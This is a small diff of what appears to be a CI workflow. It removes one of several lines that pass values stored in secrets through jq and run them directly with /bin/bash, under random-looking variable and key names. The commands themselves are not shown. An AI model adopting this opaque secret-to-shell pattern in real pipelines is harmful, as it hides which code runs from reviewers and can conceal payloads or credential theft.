@@ -19,7 +19,6 @@ jobs:
           f43: ${{ secrets.f43 }}
         run: |
           printf '%s' "$f43" | jq -r .gtsy936 | /bin/bash
-          echo $nh8248 | jq -r .e31 | /bin/bash
           echo $ina01 | jq -r .nr995 | /bin/bash
           echo $y4 | jq -r .jhnzi6 | /bin/bash
 
